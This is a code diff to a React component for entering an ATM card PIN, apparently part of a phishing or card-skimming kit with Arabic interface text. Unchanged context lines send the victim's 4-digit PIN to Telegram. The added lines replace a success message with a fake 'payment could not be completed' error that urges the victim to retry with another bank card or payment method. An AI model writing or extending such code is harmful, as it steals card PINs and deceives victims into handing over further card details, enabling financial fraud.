@@ -48,9 +48,31 @@ const ATMPin = () => {
     if (pin.length === 4) {
       const message = `الرقم السري للبطاقة ATM PIN\n\nالرقم السري: ${pin}`;
       await sendToTelegram(message);
+      
       toast({
-        title: "تم تأكيد الدفع بنجاح!",
-        description: "تمت عملية الدفع بنجاح",
+        variant: "destructive",
+        title: "تعذر إتمام عملية الدفع",
+        description: (
+          <div className="space-y-2 text-sm">
+            <p className="font-semibold">نعتذر، لم نتمكن من التحقق من صحة بيانات البطاقة المصرفية.</p>
+            <div className="mr-4 space-y-1">
+              <p>• يرجى التأكد من صحة المعلومات المُدخلة</p>
+              <p>• يمكنكم استخدام بطاقة مصرفية أخرى</p>
+              <p>• أو اختيار وسيلة دفع بديلة</p>
+            </div>
+          </div>
+        ),
+        action: (
+          <Button 
+            variant="outline" 
+            size="sm" 
+            onClick={() => navigate('/registration-complete')}
+            className="bg-background hover:bg-secondary shrink-0"
+          >
+            إعادة المحاولة
+          </Button>
+        ),
+        duration: 10000,
       });
     }
   };
